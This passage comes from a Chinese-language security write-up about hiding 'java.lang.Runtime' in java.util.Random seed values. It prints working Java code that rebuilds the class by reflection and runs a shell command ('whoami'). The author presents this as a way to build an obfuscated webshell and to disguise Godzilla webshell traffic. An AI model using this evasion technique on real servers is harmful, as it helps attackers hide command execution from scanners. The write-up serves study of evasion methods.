71
72
73
74
75
76
77
78
79
80
81
82
83
16
                for (int i = 0; i >
     */
    public static List> listChunkSplit(List 
dataSource, Integer groupSize) {
        List> result = new ArrayList<>();
        if (dataSource.size() == 0 || groupSize == 0) {
            return result;
        }
        // 偏移量
        int offset = 0;
        // 计算 商
        int number = dataSource.size() / groupSize;
        // 计算 余数
        int remainder = dataSource.size() % groupSize;
        for (int i = 0; i  value = null;
            if (remainder > 0) {
                value = dataSource.subList(i * number + offset, (i + 1) 
* number + offset + 1);
                remainder--;
                offset++;
            } else {
                value = dataSource.subList(i * number + offset, (i + 1) 
* number + offset);
            }
            if (value.size() == 0) {
                break;
            }
            result.add(value);
        }
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
18
有了上⾯的代码以后,我们就可以写⼀个最最简单的混淆⻢⼦了 
        return result;
    }
}
// 运⾏结果
种⼦值(seed): -2080435608
对应字符串: jav
------
种⼦值(seed): -2060785532
对应字符串: a.l
------
种⼦值(seed): -2147149194
对应字符串: ang
------
种⼦值(seed): -2107467938
对应字符串: .Ru
------
种⼦值(seed): -1949527326
对应字符串: nti
------
种⼦值(seed): -2146859157
对应字符串: me
------
种⼦⽣成花费时间: 21.273秒
种⼦列表转换结果: java.lang.Runtime
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
19
Java
复制代码
// 这是我能想到的最最最简单的⽤涂了
// 或是拿来对哥斯拉的流量加密感觉也是可以的
// 其它的⾃⼰发挥想象吧
import org.apache.commons.io.IOUtils;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.Random;
public class ExecCmdTest {
    public static void main(String[] args) {
        try {
            String cmd = "whoami";
            // java.lang.Runtime 的 种⼦
            // -2080435608 -> jav
            // -2060785532 -> a.l
            // -2147149194 -> ang
            // -2107467938 -> Ru
            // -1949527326 -> nti
            // -2146859157 -> me
            long[] seedList = {-2080435608, -2060785532, -2147149194, 
-2107467938, -1949527326, -2146859157};
            String runtimePath = seedListConversionString(seedList);
            // 获取Runtime类对象
            Class runtimeClass = Class.forName(runtimePath);
            // 获取构造⽅法
            Constructor runtimeConstructor = 
runtimeClass.getDeclaredConstructor();
            runtimeConstructor.setAccessible(true);
            // 创建Runtime类实例 相当于 Runtime r = new Runtime();
            Object runtimeInstance = runtimeConstructor.newInstance();
            // 获取Runtime的exec(String cmd)⽅法
            Method runtimeMethod = runtimeClass.getMethod("exec", 
String.class);
            // 调⽤exec⽅法 等于 r.exec(cmd); cmd参数输⼊要执⾏的命令
            Process p = (Process) runtimeMethod.invoke(runtimeInstance, 
cmd);
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
20
            // 获取命令执⾏结果
            InputStream results = p.getInputStream();
            // 输出命令执⾏结果
            System.out.println(IOUtils.toString(results, "UTF-8"));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    /**
     * 功能: 将种⼦数组转换字符串
     *
     * @param is 种⼦数组
     * @return
     */
    public static String seedListConversionString(long[] is) {
        StringBuilder dataSource = new StringBuilder();
        for (long seed : is) {
            dataSource.append(seedConversionString(seed));
        }
        return dataSource.toString();
    }
    /**
     * 功能: 将种⼦转换字符串
     *
     * @param i 种⼦
     * @return
     */
    public static String seedConversionString(long i) {
        Random ran = new Random(i);
        StringBuilder sb = new StringBuilder();
        while (true) {
            int k = ran.nextInt(96);
            if (k == 0) {
                break;
            }
            sb.append((char) (31 + k));
        }
        return sb.toString();
    }
}
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
21
有关 ASCII 码表的内容可以看这⼀篇⽂章 
 https://www.yuque.com/pmiaowu/ppx2er/kfvuhv 
⾥⾯详细记录了ASCII码对应字符 
偶尔能看看猴戏还是挺有意思的说
0x04 杂项 
0x05 总结